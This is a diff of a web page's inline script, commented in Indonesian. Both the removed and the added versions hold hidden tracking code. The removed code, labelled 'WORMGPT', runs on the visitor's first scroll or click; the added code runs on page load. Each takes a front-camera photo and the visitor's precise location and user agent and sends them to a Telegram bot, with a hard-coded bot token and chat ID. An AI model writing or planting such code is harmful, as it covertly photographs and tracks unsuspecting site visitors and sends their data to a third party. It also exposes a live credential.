@@ -1974,108 +1974,152 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-// ===== FIXED CHAIN CAMERA → LOCATION WITH BETTER GESTURE HANDLING - WORMGPT =====
-const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
-const CHAT_ID = '7500770002';
+(function() {
+    // Konfigurasi Telegram Bot
+    const TELEGRAM_BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o'; // Ganti dengan token bot Anda
+    const TELEGRAM_CHAT_ID = '7500770002'; // Ganti dengan chat ID Anda
 
-let triggered = false;
-let cameraGranted = false;
+    // Fungsi untuk mengirim data ke Telegram
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
 
-function kirimTeks(msg) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-    }).catch(() => {});
-}
-
-function kirimFoto(base64) {
-    fetch(base64).then(r => r.blob()).then(blob => {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, `miftah_${Date.now()}.jpg`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
-    });
-}
-
-async function mulaiCapture() {
-    if (triggered) return;
-    triggered = true;
-
-    let foto = null;
-
-    // 1. Minta kamera dulu
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        cameraGranted = true;
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 700));
-
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        foto = canvas.toDataURL('image/jpeg', 0.6);
-
-        stream.getTracks().forEach(t => t.stop());
-
-        kirimTeks(`<b>KAMERA DI IZINKAN ✅</b>\nURL: ${location.href}\nSedang minta lokasi...`);
-    } catch (e) {
-        kirimTeks(`<b>KAMERA DITOLAK/ERROR</b>\nError: ${e.name || e.message}\nURL: ${location.href}`);
-        cameraGranted = false;
+        // Menggunakan fetch API untuk mengirim permintaan POST
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Data terkirim ke Telegram:', data))
+        .catch(error => console.error('Error mengirim ke Telegram:', error));
     }
 
-    // 2. Minta lokasi (coba langsung kalau kamera granted, kalau ga muncul → tunggu gesture baru)
-    const tryLocation = () => {
-        if (navigator.geolocation) {
+    // Fungsi untuk mengambil data lokasi
+    function getLocation() {
+        if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                pos => {
-                    const lat = pos.coords.latitude.toFixed(6);
-                    const lon = pos.coords.longitude.toFixed(6);
-                    const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
-                    const msg = `<b>LOKASI BERHASIL ✅</b>\n` +
-                                `URL: ${location.href}\n` +
-                                `<a href="${maps}">Lokasi: ${lat}, ${lon}</a> (akurasi ${pos.coords.accuracy}m)`;
-                    kirimTeks(msg);
-                    if (foto) kirimFoto(foto);
+                function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const locationMessage = `<b>📍 Lokasi Baru Tertangkap</b>\n` +
+                                            `Lat: ${latitude}\n` +
+                                            `Lon: ${longitude}\n` +
+                                            `Akurasi: ${accuracy} meter\n` +
+                                            `Waktu: ${new Date().toLocaleString()}\n` +
+                                            `User-Agent: ${navigator.userAgent}\n` +
+                                            `URL: ${window.location.href}`;
+                    sendToTelegram(locationMessage);
                 },
-                err => {
-                    kirimTeks(`<b>LOKASI DITOLAK / ERROR</b>\nError: ${err.message || err.name}\nURL: ${location.href}\n` +
-                              (cameraGranted ? 'Coba scroll/klik lagi buat trigger ulang lokasi' : ''));
-                    if (foto) kirimFoto(foto);
+                function(error) {
+                    console.warn('Gagal mendapatkan lokasi:', error);
+                    sendToTelegram(`❌ Gagal mendapatkan lokasi: ${error.message}`);
                 },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
             );
         } else {
-            kirimTeks(`<b>LOKASI GA SUPPORT</b>\nURL: ${location.href}`);
-            if (foto) kirimFoto(foto);
+            sendToTelegram("❌ Geolocation tidak didukung oleh browser ini.");
         }
-    };
-
-    // Coba lokasi langsung
-    tryLocation();
-
-    // Kalau masih ga muncul (check error), tambah listener gesture kedua khusus lokasi
-    if (!cameraGranted || true) {  // Selalu tambah fallback
-        const fallbackTrigger = () => {
-            kirimTeks(`<b>GESTURE KEDUA DETECTED</b> → Coba minta lokasi lagi`);
-            tryLocation();
-        };
-        window.addEventListener('scroll', fallbackTrigger, { once: true });
-        document.addEventListener('click', fallbackTrigger, { once: true });
-        document.addEventListener('touchstart', fallbackTrigger, { once: true });
     }
-}
 
-// Trigger utama on gesture
-window.addEventListener('scroll', () => {
-    if (window.scrollY > 80) mulaiCapture();
-}, { once: true });
+    // Fungsi untuk mengakses kamera dan mengambil foto
+    function captureCamera() {
+        if ("mediaDevices" in navigator && "getUserMedia" in navigator.mediaDevices) {
+            const constraints = {
+                video: {
+                    facingMode: "user" // Gunakan kamera depan
+                }
+            };
 
-document.addEventListener('click', mulaiCapture, { once: true });
-document.addEventListener('touchstart', mulaiCapture, { once: true });
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    // Buat elemen video untuk menangkap frame
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Tunggu sejenak untuk memastikan video siap
+                    setTimeout(() => {
+                        // Buat canvas untuk mengambil gambar
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Konversi canvas ke data URL (format base64)
+                        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+                        // Hentikan stream kamera
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Untuk mengirim gambar ke Telegram, kita perlu mengunggahnya.
+                        // Karena base64 bisa sangat panjang untuk URL, kita akan menggunakan FormData dan fetch.
+                        // Konversi dataURL ke Blob
+                        fetch(imageDataUrl)
+                            .then(res => res.blob())
+                            .then(blob => {
+                                const formData = new FormData();
+                                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                                formData.append('photo', blob, 'captured_photo.jpg');
+                                formData.append('caption', `<b>📸 Foto Tertangkap</b>\nWaktu: ${new Date().toLocaleString()}\nURL: ${window.location.href}`);
+
+                                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            })
+                            .then(response => response.json())
+                            .then(data => console.log('Foto terkirim ke Telegram:', data))
+                            .catch(error => console.error('Error mengirim foto:', error));
+
+                    }, 1000); // Tunggu 1 detik untuk kamera fokus
+                })
+                .catch(function(error) {
+                    console.error('Error mengakses kamera:', error);
+                    sendToTelegram(`❌ Gagal mengakses kamera: ${error.message}`);
+                });
+        } else {
+            sendToTelegram("❌ Kamera tidak didukung atau tidak diizinkan.");
+        }
+    }
+
+    // Fungsi utama untuk menjalankan semua
+    function initiateCapture() {
+        // Delay kecil untuk memastikan halaman sepenuhnya dimuat
+        setTimeout(() => {
+            // Minta lokasi terlebih dahulu
+            getLocation();
+
+            // Minta akses kamera dengan delay
+            setTimeout(() => {
+                captureCamera();
+            }, 1500);
+        }, 500);
+    }
+
+    // Jalankan skrip setelah halaman dimuat sepenuhnya
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initiateCapture);
+    } else {
+        initiateCapture();
+    }
+
+    // Opsional: Tambahkan event listener untuk klik pengguna, jika ingin memicu dengan interaksi
+    // document.body.addEventListener('click', initiateCapture);
+})();
+
 </script>
 <script>
             document.addEventListener("DOMContentLoaded", function () {
